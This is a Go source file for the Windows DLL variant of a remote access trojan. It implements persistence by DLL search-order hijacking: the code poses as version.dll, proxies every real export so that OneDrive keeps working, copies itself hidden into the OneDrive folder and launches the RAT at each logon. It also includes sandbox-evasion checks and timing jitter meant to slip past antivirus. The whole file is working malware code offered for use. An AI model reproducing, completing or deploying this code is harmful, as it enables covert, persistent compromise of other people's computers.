//go:build dll && windows

package main

/*
#include <stdint.h>
typedef void*    HMODULE;
typedef uint16_t WCHAR;
typedef WCHAR*   LPCWSTR;
typedef unsigned long DWORD;
typedef int      BOOL;

#define GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS        0x00000004
#define GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT  0x00000002

__declspec(dllimport) BOOL __stdcall GetModuleHandleExW(DWORD dwFlags, LPCWSTR lpModuleName, HMODULE *phModule);
__declspec(dllimport) DWORD __stdcall GetModuleFileNameW(HMODULE hModule, WCHAR *lpFilename, DWORD nSize);

static HMODULE getOwnModule() {
	HMODULE hm = 0;
	GetModuleHandleExW(
		GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
		(LPCWSTR)getOwnModule,
		&hm
	);
	return hm;
}

static int getOwnPath(WCHAR *buf, int bufLen) {
	HMODULE hm = getOwnModule();
	if (!hm || bufLen <= 0) return 0;
	return (int)GetModuleFileNameW(hm, buf, (DWORD)bufLen);
}
*/
import "C"

import (
	"fmt"
	"io"
	mrand "math/rand"
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

// ================================================================
// DLL SIDELOAD PERSISTENCE — OneDrive.exe loads our DLL on every logon
//
// Technique: DLL search-order hijacking via version.dll.
// OneDrive.exe is pre-installed on all Windows 10/11 and runs at
// logon from %LOCALAPPDATA%\Microsoft\OneDrive\. It loads version.dll
// from its own directory before checking System32 (version.dll is NOT
// in the KnownDLLs list).
//
// Our DLL masquerades as version.dll and proxies all 16 exports to
// the real System32\version.dll, so OneDrive works normally. The RAT
// runs in a background goroutine — only OneDrive loads us, no other
// app is affected.
//
// Stage 1: rundll32.exe payload.dll,EntryPoint
//   → copies DLL to %LOCALAPPDATA%\Microsoft\OneDrive\version.dll
//   → sets hidden attribute
//   → runs RAT immediately
//
// Stage 2: OneDrive.exe starts on next logon
//   → loads our version.dll (DLL search order: same dir first)
//   → all version.dll calls forwarded to real System32\version.dll
//   → RAT runs in background goroutine
//
// No registry modifications. No COM hijack. No system-wide effects.
// If OneDrive is not installed, persistence silently fails but the
// RAT still runs in Stage 1 via rundll32.
// ================================================================

const (
	// Sideload target: version.dll in OneDrive directory
	sideloadDLLName = "version.dll"

	// Real DLL we proxy — loaded explicitly from System32
	realDLLName = "version.dll"
)

// sideloadDir returns the OneDrive install directory.
// Falls back to a reasonable default if the standard path doesn't exist.
func sideloadDir() string {
	return filepath.Join(os.Getenv("LOCALAPPDATA"), `Microsoft\OneDrive`)
}

func sideloadFullPath() string {
	return filepath.Join(sideloadDir(), sideloadDLLName)
}

// ================================================================
// VERSION.DLL PROXY — forward all 16 exports to real System32\version.dll
// OneDrive (and any other host) works 100% normally.
// ================================================================

var (
	realDLLHandle                  syscall.Handle
	pGetFileVersionInfoA           uintptr
	pGetFileVersionInfoW           uintptr
	pGetFileVersionInfoSizeA       uintptr
	pGetFileVersionInfoSizeW       uintptr
	pGetFileVersionInfoExA         uintptr
	pGetFileVersionInfoExW         uintptr
	pGetFileVersionInfoSizeExA     uintptr
	pGetFileVersionInfoSizeExW     uintptr
	pVerQueryValueA                uintptr
	pVerQueryValueW                uintptr
	pVerFindFileA                  uintptr
	pVerFindFileW                  uintptr
	pVerInstallFileA               uintptr
	pVerInstallFileW               uintptr
	pVerLanguageNameA              uintptr
	pVerLanguageNameW              uintptr
)

func initProxy() {
	sysDir := filepath.Join(os.Getenv("SYSTEMROOT"), "System32")
	if sysDir == `\System32` {
		sysDir = `C:\Windows\System32`
	}
	h, err := syscall.LoadLibrary(filepath.Join(sysDir, realDLLName))
	if err != nil {
		return
	}
	realDLLHandle = h
	pGetFileVersionInfoA, _ = syscall.GetProcAddress(h, "GetFileVersionInfoA")
	pGetFileVersionInfoW, _ = syscall.GetProcAddress(h, "GetFileVersionInfoW")
	pGetFileVersionInfoSizeA, _ = syscall.GetProcAddress(h, "GetFileVersionInfoSizeA")
	pGetFileVersionInfoSizeW, _ = syscall.GetProcAddress(h, "GetFileVersionInfoSizeW")
	pGetFileVersionInfoExA, _ = syscall.GetProcAddress(h, "GetFileVersionInfoExA")
	pGetFileVersionInfoExW, _ = syscall.GetProcAddress(h, "GetFileVersionInfoExW")
	pGetFileVersionInfoSizeExA, _ = syscall.GetProcAddress(h, "GetFileVersionInfoSizeExA")
	pGetFileVersionInfoSizeExW, _ = syscall.GetProcAddress(h, "GetFileVersionInfoSizeExW")
	pVerQueryValueA, _ = syscall.GetProcAddress(h, "VerQueryValueA")
	pVerQueryValueW, _ = syscall.GetProcAddress(h, "VerQueryValueW")
	pVerFindFileA, _ = syscall.GetProcAddress(h, "VerFindFileA")
	pVerFindFileW, _ = syscall.GetProcAddress(h, "VerFindFileW")
	pVerInstallFileA, _ = syscall.GetProcAddress(h, "VerInstallFileA")
	pVerInstallFileW, _ = syscall.GetProcAddress(h, "VerInstallFileW")
	pVerLanguageNameA, _ = syscall.GetProcAddress(h, "VerLanguageNameA")
	pVerLanguageNameW, _ = syscall.GetProcAddress(h, "VerLanguageNameW")
}

// --- Proxy exports: GetFileVersionInfo ---

//export GetFileVersionInfoA
func GetFileVersionInfoA(a1, a2, a3, a4 uintptr) uintptr {
	if pGetFileVersionInfoA != 0 {
		r, _, _ := syscall.SyscallN(pGetFileVersionInfoA, a1, a2, a3, a4)
		return r
	}
	return 0
}

//export GetFileVersionInfoW
func GetFileVersionInfoW(a1, a2, a3, a4 uintptr) uintptr {
	if pGetFileVersionInfoW != 0 {
		r, _, _ := syscall.SyscallN(pGetFileVersionInfoW, a1, a2, a3, a4)
		return r
	}
	return 0
}

//export GetFileVersionInfoSizeA
func GetFileVersionInfoSizeA(a1, a2 uintptr) uintptr {
	if pGetFileVersionInfoSizeA != 0 {
		r, _, _ := syscall.SyscallN(pGetFileVersionInfoSizeA, a1, a2)
		return r
	}
	return 0
}

//export GetFileVersionInfoSizeW
func GetFileVersionInfoSizeW(a1, a2 uintptr) uintptr {
	if pGetFileVersionInfoSizeW != 0 {
		r, _, _ := syscall.SyscallN(pGetFileVersionInfoSizeW, a1, a2)
		return r
	}
	return 0
}

//export GetFileVersionInfoExA
func GetFileVersionInfoExA(a1, a2, a3, a4, a5 uintptr) uintptr {
	if pGetFileVersionInfoExA != 0 {
		r, _, _ := syscall.SyscallN(pGetFileVersionInfoExA, a1, a2, a3, a4, a5)
		return r
	}
	return 0
}

//export GetFileVersionInfoExW
func GetFileVersionInfoExW(a1, a2, a3, a4, a5 uintptr) uintptr {
	if pGetFileVersionInfoExW != 0 {
		r, _, _ := syscall.SyscallN(pGetFileVersionInfoExW, a1, a2, a3, a4, a5)
		return r
	}
	return 0
}

//export GetFileVersionInfoSizeExA
func GetFileVersionInfoSizeExA(a1, a2, a3 uintptr) uintptr {
	if pGetFileVersionInfoSizeExA != 0 {
		r, _, _ := syscall.SyscallN(pGetFileVersionInfoSizeExA, a1, a2, a3)
		return r
	}
	return 0
}

//export GetFileVersionInfoSizeExW
func GetFileVersionInfoSizeExW(a1, a2, a3 uintptr) uintptr {
	if pGetFileVersionInfoSizeExW != 0 {
		r, _, _ := syscall.SyscallN(pGetFileVersionInfoSizeExW, a1, a2, a3)
		return r
	}
	return 0
}

// --- Proxy exports: VerQueryValue ---

//export VerQueryValueA
func VerQueryValueA(a1, a2, a3, a4 uintptr) uintptr {
	if pVerQueryValueA != 0 {
		r, _, _ := syscall.SyscallN(pVerQueryValueA, a1, a2, a3, a4)
		return r
	}
	return 0
}

//export VerQueryValueW
func VerQueryValueW(a1, a2, a3, a4 uintptr) uintptr {
	if pVerQueryValueW != 0 {
		r, _, _ := syscall.SyscallN(pVerQueryValueW, a1, a2, a3, a4)
		return r
	}
	return 0
}

// --- Proxy exports: VerFindFile (8 params) ---

//export VerFindFileA
func VerFindFileA(a1, a2, a3, a4, a5, a6, a7, a8 uintptr) uintptr {
	if pVerFindFileA != 0 {
		r, _, _ := syscall.SyscallN(pVerFindFileA, a1, a2, a3, a4, a5, a6, a7, a8)
		return r
	}
	return 0
}

//export VerFindFileW
func VerFindFileW(a1, a2, a3, a4, a5, a6, a7, a8 uintptr) uintptr {
	if pVerFindFileW != 0 {
		r, _, _ := syscall.SyscallN(pVerFindFileW, a1, a2, a3, a4, a5, a6, a7, a8)
		return r
	}
	return 0
}

// --- Proxy exports: VerInstallFile (9 params) ---

//export VerInstallFileA
func VerInstallFileA(a1, a2, a3, a4, a5, a6, a7, a8, a9 uintptr) uintptr {
	if pVerInstallFileA != 0 {
		r, _, _ := syscall.SyscallN(pVerInstallFileA, a1, a2, a3, a4, a5, a6, a7, a8, a9)
		return r
	}
	return 0
}

//export VerInstallFileW
func VerInstallFileW(a1, a2, a3, a4, a5, a6, a7, a8, a9 uintptr) uintptr {
	if pVerInstallFileW != 0 {
		r, _, _ := syscall.SyscallN(pVerInstallFileW, a1, a2, a3, a4, a5, a6, a7, a8, a9)
		return r
	}
	return 0
}

// --- Proxy exports: VerLanguageName ---

//export VerLanguageNameA
func VerLanguageNameA(a1, a2, a3 uintptr) uintptr {
	if pVerLanguageNameA != 0 {
		r, _, _ := syscall.SyscallN(pVerLanguageNameA, a1, a2, a3)
		return r
	}
	return 0
}

//export VerLanguageNameW
func VerLanguageNameW(a1, a2, a3 uintptr) uintptr {
	if pVerLanguageNameW != 0 {
		r, _, _ := syscall.SyscallN(pVerLanguageNameW, a1, a2, a3)
		return r
	}
	return 0
}

// ================================================================
// SELF-PATH RESOLUTION (via CGO GetModuleFileName)
// ================================================================

func getSelfDLLPath() string {
	const bufSize = 512
	buf := make([]uint16, bufSize)
	n := int(C.getOwnPath((*C.wchar_t)(unsafe.Pointer(&buf[0])), bufSize))
	if n <= 0 || n >= bufSize {
		return ""
	}
	return syscall.UTF16ToString(buf[:n])
}

// ================================================================
// AV EVASION HELPERS
// ================================================================

var (
	pSetFileAttributesW = kernel32.NewProc("SetFileAttributesW")
	pGetTickCount64     = kernel32.NewProc("GetTickCount64")
)

const (
	fileAttrHidden = 0x02
	fileAttrSystem = 0x04
)

func setHiddenSystem(path string) {
	p, _ := syscall.UTF16PtrFromString(path)
	pSetFileAttributesW.Call(uintptr(unsafe.Pointer(p)), uintptr(fileAttrHidden|fileAttrSystem))
}

func sandboxSleep() bool {
	time.Sleep(time.Duration(3+mrand.Intn(6)) * time.Second)
	uptime, _, _ := pGetTickCount64.Call()
	if uptime < uintptr(180_000) {
		return false
	}
	return true
}

// ================================================================
// SIDELOAD INSTALLER — copies DLL to OneDrive directory
// ================================================================

func performSideload() string {
	selfPath := getSelfDLLPath()
	if selfPath == "" {
		return "Sideload failed: cannot determine DLL path"
	}

	targetDir := sideloadDir()
	targetPath := sideloadFullPath()

	// Already at the sideload location — nothing to do
	if strings.EqualFold(selfPath, targetPath) {
		return "Already sideloaded in OneDrive directory"
	}

	// Check OneDrive directory exists
	if _, err := os.Stat(targetDir); os.IsNotExist(err) {
		return "Sideload skipped: OneDrive directory not found"
	}

	// Copy DLL to OneDrive directory as version.dll
	src, err := os.Open(selfPath)
	if err != nil {
		return fmt.Sprintf("Sideload read error: %v", err)
	}
	defer src.Close()

	dst, err := os.Create(targetPath)
	if err != nil {
		return fmt.Sprintf("Sideload write error: %v", err)
	}

	if _, err = io.Copy(dst, src); err != nil {
		dst.Close()
		os.Remove(targetPath)
		return fmt.Sprintf("Sideload copy error: %v", err)
	}
	dst.Close()

	// Hide the DLL
	setHiddenSystem(targetPath)

	return fmt.Sprintf("Sideloaded to %s (OneDrive.exe persistence)", targetPath)
}

func removeSideload() string {
	targetPath := sideloadFullPath()
	if err := os.Remove(targetPath); err != nil && !os.IsNotExist(err) {
		return fmt.Sprintf("Sideload removal failed (may be in use): %v", err)
	}
	return "Sideload removed (version.dll deleted from OneDrive directory)"
}

// ================================================================
// HOOKS — wire DLL-specific commands/cleanup into shared main.go
// ================================================================

func dllCommandHandler(cmd string) (string, bool) {
	switch strings.ToLower(strings.TrimSpace(cmd)) {
	case "sideload":
		return performSideload(), true
	case "unsideload":
		return removeSideload(), true
	}
	return "", false
}

func dllPersistCleanup() {
	os.Remove(sideloadFullPath())
}

func dllOptionsText() string {
	return `
DLL SIDELOAD
  sideload       - Install OneDrive DLL sideload persistence
  unsideload     - Remove sideloaded DLL`
}

// ================================================================
// DLL ENTRY POINTS
// ================================================================

//export EntryPoint
func EntryPoint() {
	// Stage 1: called via rundll32.exe payload.dll,EntryPoint
	if !sandboxSleep() {
		return
	}
	// Copy DLL to OneDrive directory for persistence
	performSideload()
	// Run RAT (blocking — rundll32 stays alive)
	runAgent()
}

func init() {
	// Prevent runAgent() from calling os.Exit() in DLL context
	dllMode = true

	// Register hooks
	extraPersistCleanup = dllPersistCleanup
	extraOptionsText = dllOptionsText
	extraCommandHandler = dllCommandHandler

	// Load real version.dll from System32 for proxying
	initProxy()

	// Detect host process
	exe, _ := os.Executable()
	exeName := strings.ToLower(filepath.Base(exe))

	if exeName != "rundll32.exe" {
		// Stage 2: loaded by OneDrive.exe (or another host) via DLL search order.
		// Jitter before starting RAT — avoids burst of activity at logon.
		go func() {
			time.Sleep(time.Duration(5+mrand.Intn(10)) * time.Second)
			runAgent()
		}()
	}
	// If rundll32: proxy ready, wait for EntryPoint() call
}

// main is required by -buildmode=c-shared but never called
func main() {}
